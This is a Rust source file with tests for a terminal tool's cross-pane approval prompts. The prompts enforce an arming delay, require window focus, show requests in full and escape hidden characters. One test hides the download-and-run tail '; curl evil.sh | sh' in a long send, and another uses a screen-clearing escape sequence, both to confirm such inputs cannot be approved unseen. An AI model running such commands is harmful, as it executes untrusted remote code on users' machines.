//! Cross-pane approval chrome. It is composed after pane cells, so pane output cannot draw it.

use std::fmt::Write as _;
use std::time::{Duration, Instant};

use pinfold_proto::link::{ApprovalAction, ApprovalAnswer};
use pinfold_proto::{Cell, Frame};
use winit::keyboard::{Key, NamedKey};

use crate::link::Approval;
use crate::paste::{self, AMBER, GROUND, RED, TEXT};

/// How long a prompt is on screen in a focused window before an allow key counts, so typing
/// already under way in a pane cannot allow a prompt that appeared mid-word.
pub const ARMED_AFTER: Duration = Duration::from_millis(500);
/// Most prompts waiting at once; past this a new one is denied at once.
pub const MAX_QUEUED: usize = 16;
/// Pane text while a prompt is up, so lookalike rows a pane draws read as pane text.
pub(crate) const MUTED: u32 = 0x0055_5a63;

/// Turns only the documented, non-repeating window key into an answer. Denial always counts.
/// Allowing needs the prompt `armed` and shown whole, so nothing unseen can be approved.
pub fn answer(key: &Key, armed: bool, shown_whole: bool) -> Option<ApprovalAnswer> {
    let answer = match key {
        Key::Character(key) if key.eq_ignore_ascii_case("y") => ApprovalAnswer::AllowOnce,
        Key::Character(key) if key.eq_ignore_ascii_case("a") => {
            ApprovalAnswer::AllowForThirtyMinutes
        }
        Key::Character(key) if key.eq_ignore_ascii_case("n") => ApprovalAnswer::Deny,
        Key::Named(NamedKey::Escape) => ApprovalAnswer::Deny,
        _ => return None,
    };
    (answer == ApprovalAnswer::Deny || (armed && shown_whole)).then_some(answer)
}

/// Prompts waiting for a key, oldest first.
#[derive(Default)]
pub struct Queue {
    prompts: Vec<Approval>,
    /// When the prompt on screen was first drawn in a focused window; `None` until then.
    shown: Option<Instant>,
    focused: bool,
}

impl Queue {
    /// Whether no prompt waits.
    pub fn is_empty(&self) -> bool {
        self.prompts.is_empty()
    }

    /// Adds a prompt, or replaces the batch it grew from. When the prompt on screen changes the
    /// arming delay starts again. Returns the id of a new prompt the full queue denies.
    pub fn add(&mut self, approval: Approval) -> Option<u64> {
        match self
            .prompts
            .iter()
            .position(|known| known.same_batch(&approval))
        {
            Some(index) => {
                if index == 0 {
                    self.shown = None;
                }
                self.prompts[index] = approval;
            }
            None if self.prompts.len() >= MAX_QUEUED => return Some(approval.id),
            None => {
                if self.prompts.is_empty() {
                    self.shown = None;
                }
                self.prompts.push(approval);
            }
        }
        None
    }

    /// Notes window focus. Allow keys are unarmed until the prompt is drawn while focused.
    pub fn focus(&mut self, focused: bool) {
        self.focused = focused;
        self.shown = None;
    }

    /// Answers the prompt on screen with `key`, in a pane area of `rows` × `columns`. The next
    /// prompt then comes up unarmed, so a key meant for this one cannot allow it.
    pub fn key(
        &mut self,
        key: &Key,
        now: Instant,
        rows: u16,
        columns: u16,
    ) -> Option<(u64, ApprovalAnswer)> {
        let prompt = self.prompts.first()?;
        let whole = fits(prompt, self.prompts.len(), rows, columns);
        let armed = self.focused
            && self
                .shown
                .is_some_and(|shown| now.saturating_duration_since(shown) >= ARMED_AFTER);
        let answer = answer(key, armed, whole)?;
        // Trust and owner prompts have no lasting grant to give; `a` there is not a key the
        // legend offers.
        if prompt.action.is_once() && answer == ApprovalAnswer::AllowForThirtyMinutes {
            return None;
        }
        let id = prompt.id;
        self.prompts.remove(0);
        self.shown = None;
        Some((id, answer))
    }

    /// Draws the prompt on screen, if any, and starts its arming delay in a focused window.
    pub fn draw(&mut self, frame: &mut Frame, now: Instant) {
        if let Some(prompt) = self.prompts.first() {
            banner(frame, prompt, self.prompts.len());
            if self.focused && self.shown.is_none() {
                self.shown = Some(now);
            }
        }
    }
}

/// The request as rows of at most `columns` characters: a border, who asks what, then every
/// send text in full, wrapped, after its number and byte length.
fn lines(prompt: &Approval, queued: usize, columns: usize) -> Vec<String> {
    let action = match prompt.action {
        ApprovalAction::Read => "read",
        ApprovalAction::Send => "send to",
        ApprovalAction::Trust => return trust_lines(prompt, queued, columns),
        ApprovalAction::Owner => return owner_lines(prompt, queued, columns),
    };
    let border = format!("{:─<columns$}", "── Pinfold approval ");
    let mut lines: Vec<String> = vec![border.chars().take(columns.max(1)).collect()];
    let mut head = format!(
        " ◆ needs you  Pane {} asks to {action} pane {}",
        prompt.caller, prompt.target
    );
    if queued > 1 {
        let _ = write!(head, " (1 of {queued})");
    }
    if !prompt.texts.is_empty() {
        let _ = write!(head, ", {} text(s):", prompt.texts.len());
    }
    lines.extend(wrap(&head, columns));
    for (index, text) in prompt.texts.iter().enumerate() {
        let shown = format!(
            "text {} ({} bytes): {}",
            index + 1,
            text.len(),
            visible(text)
        );
        lines.extend(wrap(&shown, columns));
    }
    lines
}

/// A trust prompt as rows: a border, the directory, then every `run` line in full, wrapped.
fn trust_lines(prompt: &Approval, queued: usize, columns: usize) -> Vec<String> {
    let border = format!("{:─<columns$}", "── Pinfold workspace trust ");
    let mut lines: Vec<String> = vec![border.chars().take(columns.max(1)).collect()];
    let (root, runs) = prompt
        .texts
        .split_first()
        .map_or(("", &[][..]), |(root, runs)| (root.as_str(), runs));
    let mut head = format!(" ◆ needs you  Trust the layout of {}", visible(root));
    if queued > 1 {
        let _ = write!(head, " (1 of {queued})");
    }
    if prompt.target == 1 {
        head.push_str(", changed since it was trusted");
    }
    let _ = write!(head, "? It types {} run line(s):", runs.len());
    lines.extend(wrap(&head, columns));
    for (index, run) in runs.iter().enumerate() {
        lines.extend(wrap(
            &format!("run {}: {}", index + 1, visible(run)),
            columns,
        ));
    }
    lines
}

/// An owner prompt as rows: a border, the method, then what it touches, wrapped.
fn owner_lines(prompt: &Approval, queued: usize, columns: usize) -> Vec<String> {
    let border = format!("{:─<columns$}", "── Pinfold owner action ");
    let mut lines: Vec<String> = vec![border.chars().take(columns.max(1)).collect()];
    let (method, details) = prompt
        .texts
        .split_first()
        .map_or(("", &[][..]), |(method, details)| {
            (method.as_str(), details)
        });
    let mut head = format!(
        " ◆ needs you  A terminal outside every pane asks to run {}",
        visible(method)
    );
    if queued > 1 {
        let _ = write!(head, " (1 of {queued})");
    }
    lines.extend(wrap(&head, columns));
    for detail in details {
        lines.extend(wrap(&visible(detail), columns));
    }
    lines
}

pub(crate) fn wrap(text: &str, columns: usize) -> Vec<String> {
    let characters: Vec<char> = text.chars().collect();
    characters
        .chunks(columns.max(1))
        .map(|chunk| chunk.iter().collect())
        .collect()
}

/// Whether the whole request, with `queued` prompts waiting, fits in a pane area of
/// `rows` × `columns`.
pub fn fits(prompt: &Approval, queued: usize, rows: u16, columns: u16) -> bool {
    lines(prompt, queued, usize::from(columns)).len() <= usize::from(rows)
}

/// Mutes every pane cell, draws the request over the bottom of the pane area under a border
/// row, and the key legend on its own chrome row, which is never cut. The legend says how many
/// rows above are the prompt's. A request too long to show whole offers only denial.
fn banner(frame: &mut Frame, prompt: &Approval, queued: usize) {
    let columns = usize::from(frame.columns);
    let rows = usize::from(frame.rows);
    for cell in &mut frame.cells {
        cell.foreground = MUTED;
    }
    let lines = lines(prompt, queued, columns);
    let whole = lines.len() <= rows;
    let shown = lines.len().min(rows);
    for (offset, line) in lines.iter().take(shown).enumerate() {
        let start = (rows - shown + offset) * columns;
        let Some(cells) = frame.cells.get_mut(start..start + columns) else {
            break;
        };
        let colour = if offset <= 1 { AMBER } else { TEXT };
        let mut characters = line.chars();
        for cell in cells {
            *cell = Cell {
                character: characters.next().unwrap_or(' '),
                foreground: colour,
                background: GROUND,
            };
        }
    }
    let (allow, deny) = match prompt.action {
        ApprovalAction::Trust => ("y trust", "n/Esc don't trust"),
        ApprovalAction::Owner => ("y allow once", "n/Esc deny"),
        ApprovalAction::Read | ApprovalAction::Send => {
            ("y allow once · a allow 30 min", "n/Esc deny")
        }
    };
    let legend = if whole {
        (
            format!(" {allow} · {deny} · the {shown} rows above are this prompt"),
            TEXT,
        )
    } else {
        (
            format!(
                " ✕ too long to show whole; only {deny} is offered · the {shown} rows above are this prompt"
            ),
            RED,
        )
    };
    paste::row(frame, &[legend]);
}

/// Shows printable ASCII and the space as they are, newline and tab as marks, and every other
/// character as `<U+XXXX>`, so nothing sent can hide, disguise or reorder itself, and each shown
/// character takes one cell.
pub(crate) fn visible(text: &str) -> String {
    let mut shown = String::new();
    let mut previous = '\n';
    for character in text.chars() {
        match character {
            // A run of spaces could push the rest out of sight, so each after the first shows.
            ' ' if previous == ' ' => shown.push('·'),
            ' ' | '!'..='~' => shown.push(character),
            '\n' => shown.push('⏎'),
            '\t' => shown.push('⇥'),
            _ => {
                let _ = write!(shown, "<U+{:04X}>", u32::from(character));
            }
        }
        previous = character;
    }
    shown
}

#[cfg(test)]
mod tests {
    use super::*;
    use pinfold_proto::Cell;

    #[test]
    fn only_the_documented_keys_answer() {
        assert_eq!(
            answer(&Key::Character("y".into()), true, true),
            Some(ApprovalAnswer::AllowOnce)
        );
        assert_eq!(
            answer(&Key::Character("a".into()), true, true),
            Some(ApprovalAnswer::AllowForThirtyMinutes)
        );
        assert_eq!(
            answer(&Key::Character("n".into()), true, true),
            Some(ApprovalAnswer::Deny)
        );
        assert_eq!(
            answer(&Key::Named(NamedKey::Escape), true, true),
            Some(ApprovalAnswer::Deny)
        );
        let partial = |key: &str| answer(&Key::Character(key.into()), true, false);
        assert_eq!(partial("y"), None);
        assert_eq!(partial("a"), None);
        assert_eq!(partial("n"), Some(ApprovalAnswer::Deny));
        // Unarmed, allowing does nothing and denying still works.
        assert_eq!(answer(&Key::Character("y".into()), false, true), None);
        assert_eq!(
            answer(&Key::Named(NamedKey::Escape), false, true),
            Some(ApprovalAnswer::Deny)
        );
        assert_eq!(answer(&Key::Named(NamedKey::Enter), true, true), None);
    }

    #[test]
    fn only_printable_ascii_is_shown_as_is_in_exact_send_text() {
        assert_eq!(
            visible("a\n\t\r\u{1b}\u{202e}b"),
            "a⏎⇥<U+000D><U+001B><U+202E>b"
        );
        // A variation selector, a combining mark, a Hangul filler and a non-ASCII space.
        assert_eq!(
            visible("x\u{fe0f}e\u{301}\u{3164}\u{a0}é"),
            "x<U+FE0F>e<U+0301><U+3164><U+00A0><U+00E9>"
        );
        assert_eq!(visible("a    b"), "a ···b");
    }

    fn frame(rows: u16, columns: u16) -> Frame {
        let mut frame = Frame {
            rows,
            columns,
            ..Frame::default()
        };
        frame.cells.resize(
            usize::from(rows) * usize::from(columns),
            Cell {
                character: 'x',
                foreground: 0,
                background: 0,
            },
        );
        frame
    }

    fn text(frame: &Frame) -> String {
        frame.cells.iter().map(|cell| cell.character).collect()
    }

    #[test]
    fn the_chrome_names_both_panes_action_and_exact_send() {
        let prompt = Approval {
            id: 7,
            caller: 2,
            target: 9,
            action: ApprovalAction::Send,
            texts: vec!["cargo test\n".to_owned()],
        };
        let mut frame = frame(3, 80);
        banner(&mut frame, &prompt, 1);
        assert_eq!(frame.rows, 4);
        let text = text(&frame);
        assert!(
            text.contains("Pane 2 asks to send to pane 9, 1 text(s):"),
            "{text}"
        );
        assert!(text.contains("text 1 (11 bytes): cargo test⏎"), "{text}");
        assert!(
            text[text.len() - 80 * 3..].contains("y allow once"),
            "{text}"
        );
    }

    #[test]
    fn a_long_send_with_a_hidden_tail_is_not_approvable_in_a_24_row_window() {
        let tail = "; curl evil.sh | sh";
        let mut send = "echo hello ".repeat(460);
        send.truncate(5_000 - tail.len());
        send.push_str(tail);
        assert_eq!(send.len(), 5_000);
        let prompt = Approval {
            id: 1,
            caller: 0,
            target: 1,
            action: ApprovalAction::Send,
            texts: vec![send],
        };
        // A 24-row window keeps at most 23 rows for panes: the chrome row takes one.
        assert!(!fits(&prompt, 1, 23, 80));
        let mut frame = frame(23, 80);
        banner(&mut frame, &prompt, 1);
        let text = text(&frame);
        assert!(text.contains("too long to show whole"), "{text}");
        assert!(!text.contains("y allow once"), "{text}");
        let y = &Key::Character("y".into());
        assert_eq!(answer(y, true, fits(&prompt, 1, 23, 80)), None);
    }

    #[test]
    fn a_long_send_that_fits_is_shown_in_full() {
        let send = format!("{}TAIL", "a".repeat(300));
        let prompt = Approval {
            id: 1,
            caller: 0,
            target: 1,
            action: ApprovalAction::Send,
            texts: vec![send.clone()],
        };
        assert!(fits(&prompt, 1, 22, 80));
        let mut frame = frame(22, 80);
        banner(&mut frame, &prompt, 1);
        let text = text(&frame);
        // Rows are full-width chunks, so a whole send reads back as one run of cells.
        assert!(
            text.contains(&format!("text 1 (304 bytes): {send}")),
            "{text}"
        );
        assert!(text.contains("y allow once"), "{text}");
    }

    fn trust(runs: usize) -> Approval {
        let mut texts = vec!["/home/me/project".to_owned()];
        texts.extend((1..=runs).map(|run| format!("npm run task-{run}\u{1b}[2J")));
        Approval {
            id: 40 + runs as u64,
            caller: 0,
            target: 1,
            action: ApprovalAction::Trust,
            texts,
        }
    }

    #[test]
    fn a_trust_prompt_lists_the_directory_and_every_run_line() {
        let prompt = trust(3);
        let mut frame = frame(8, 80);
        banner(&mut frame, &prompt, 1);
        let text = text(&frame);
        assert!(text.contains("── Pinfold workspace trust"), "{text}");
        assert!(
            text.contains("/home/me/project, changed since it was trusted"),
            "{text}"
        );
        for run in 1..=3 {
            let shown = format!("run {run}: npm run task-{run}<U+001B>[2J");
            assert!(text.contains(&shown), "{text}");
        }
        assert!(text.contains("y trust · n/Esc don't trust"), "{text}");
    }

    #[test]
    fn trust_is_not_offered_when_the_run_lines_do_not_fit_and_a_never_trusts() {
        let start = Instant::now();
        let later = start + ARMED_AFTER;
        let mut queue = Queue::default();
        queue.focus(true);
        let _ = queue.add(trust(30));
        let mut frame = frame(23, 80);
        queue.draw(&mut frame, start);
        let text = text(&frame);
        assert!(text.contains("only n/Esc don't trust is offered"), "{text}");
        assert!(!text.contains("y trust"), "{text}");
        assert_eq!(queue.key(&Key::Character("y".into()), later, 23, 80), None);

        let mut queue = Queue::default();
        queue.focus(true);
        let _ = queue.add(trust(2));
        let _ = queue.add(trust(1));
        queue.draw(&mut frame, start);
        assert_eq!(queue.key(&Key::Character("a".into()), later, 23, 80), None);
        assert_eq!(
            queue.key(&Key::Character("y".into()), later, 23, 80),
            Some((42, ApprovalAnswer::AllowOnce))
        );
        // Trust prompts never merge, even from the same directory.
        assert!(!queue.is_empty());
    }

    #[test]
    fn an_owner_prompt_names_the_method_and_offers_no_lasting_grant() {
        let start = Instant::now();
        let prompt = Approval {
            id: 5,
            caller: 0,
            target: 0,
            action: ApprovalAction::Owner,
            texts: vec!["workspace.open".to_owned(), "/home/me/project\n".to_owned()],
        };
        let mut queue = Queue::default();
        queue.focus(true);
        let _ = queue.add(prompt);
        let mut frame = frame(6, 80);
        queue.draw(&mut frame, start);
        let text = text(&frame);
        assert!(text.contains("── Pinfold owner action"), "{text}");
        assert!(
            text.contains("A terminal outside every pane asks to run workspace.open"),
            "{text}"
        );
        assert!(text.contains("/home/me/project⏎"), "{text}");
        assert!(text.contains(" y allow once · n/Esc deny ·"), "{text}");
        let later = start + ARMED_AFTER;
        assert_eq!(queue.key(&Key::Character("a".into()), later, 6, 80), None);
        assert_eq!(
            queue.key(&Key::Character("y".into()), later, 6, 80),
            Some((5, ApprovalAnswer::AllowOnce))
        );
    }

    fn read(target: u32) -> Approval {
        Approval {
            id: u64::from(target),
            caller: 0,
            target,
            action: ApprovalAction::Read,
            texts: Vec::new(),
        }
    }

    #[test]
    fn a_key_for_the_first_prompt_cannot_allow_the_next_before_it_is_armed() {
        let start = Instant::now();
        let mut queue = Queue::default();
        queue.focus(true);
        assert_eq!(queue.add(read(1)), None);
        assert_eq!(queue.add(read(2)), None);
        let mut frame = frame(5, 80);
        queue.draw(&mut frame, start);
        let shown = text(&frame);
        assert!(shown.contains("(1 of 2)"), "{shown}");
        assert!(shown.contains("── Pinfold approval"), "{shown}");
        assert!(
            shown.contains("the 2 rows above are this prompt"),
            "{shown}"
        );
        assert!(
            frame.cells[..80]
                .iter()
                .all(|cell| cell.foreground == MUTED)
        );
        let y = Key::Character("y".into());
        let armed = start + ARMED_AFTER;
        assert_eq!(
            queue.key(&y, armed, 22, 80),
            Some((1, ApprovalAnswer::AllowOnce))
        );
        // Not drawn yet, so not armed however late the key comes.
        assert_eq!(queue.key(&y, armed + ARMED_AFTER, 22, 80), None);
        queue.draw(&mut frame, armed);
        let early = armed + ARMED_AFTER - Duration::from_millis(1);
        assert_eq!(queue.key(&y, early, 22, 80), None);
        assert!(!queue.is_empty());
        assert_eq!(
            queue.key(&y, armed + ARMED_AFTER, 22, 80),
            Some((2, ApprovalAnswer::AllowOnce))
        );
        assert!(queue.is_empty());
    }

    #[test]
    fn allow_needs_focus_and_regaining_it_rearms() {
        let start = Instant::now();
        let mut queue = Queue::default();
        let _ = queue.add(read(1));
        let mut frame = frame(5, 80);
        let y = Key::Character("y".into());
        queue.draw(&mut frame, start);
        assert_eq!(queue.key(&y, start + ARMED_AFTER * 4, 22, 80), None);
        queue.focus(true);
        queue.draw(&mut frame, start + ARMED_AFTER);
        assert_eq!(queue.key(&y, start + ARMED_AFTER, 22, 80), None);
        queue.focus(false);
        queue.focus(true);
        queue.draw(&mut frame, start + ARMED_AFTER * 2);
        assert_eq!(queue.key(&y, start + ARMED_AFTER * 2, 22, 80), None);
        assert_eq!(
            queue.key(&y, start + ARMED_AFTER * 3, 22, 80),
            Some((1, ApprovalAnswer::AllowOnce))
        );
    }

    #[test]
    fn only_a_new_head_rearms_deny_needs_no_arming_and_the_queue_is_capped() {
        let start = Instant::now();
        let mut queue = Queue::default();
        queue.focus(true);
        let _ = queue.add(read(1));
        let mut frame = frame(5, 80);
        queue.draw(&mut frame, start);
        // Prompts joining behind the head do not hold it unarmed.
        for target in 2..=MAX_QUEUED as u32 {
            assert_eq!(queue.add(read(target)), None);
        }
        assert_eq!(queue.add(read(99)), Some(99));
        let y = Key::Character("y".into());
        assert_eq!(
            queue.key(&y, start + ARMED_AFTER, 22, 80),
            Some((1, ApprovalAnswer::AllowOnce))
        );
        let escape = Key::Named(NamedKey::Escape);
        assert_eq!(
            queue.key(&escape, start, 22, 80),
            Some((2, ApprovalAnswer::Deny))
        );
    }
}
